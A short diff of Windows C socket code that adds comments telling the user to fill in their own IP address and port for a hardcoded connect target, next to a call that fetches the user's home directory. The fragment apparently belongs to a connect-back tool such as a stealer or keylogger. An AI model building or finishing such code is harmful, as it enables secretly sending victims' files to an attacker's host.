@@ -28,9 +28,9 @@ int main()
 
     WSAStartup(MAKEWORD(2, 0), &WSAData);
     server = socket(AF_INET, SOCK_STREAM, 0);
-    addr.sin_addr.s_addr = inet_addr("192.168.0.29");
+    addr.sin_addr.s_addr = inet_addr("192.168.0.29"); // Your Ip address.
     addr.sin_family = AF_INET;
-    addr.sin_port = htons(5555);
+    addr.sin_port = htons(5555);  // Your port here.
     connect(server, (SOCKADDR *)&addr, sizeof(addr));
 
     char* pPath = userDirectory();
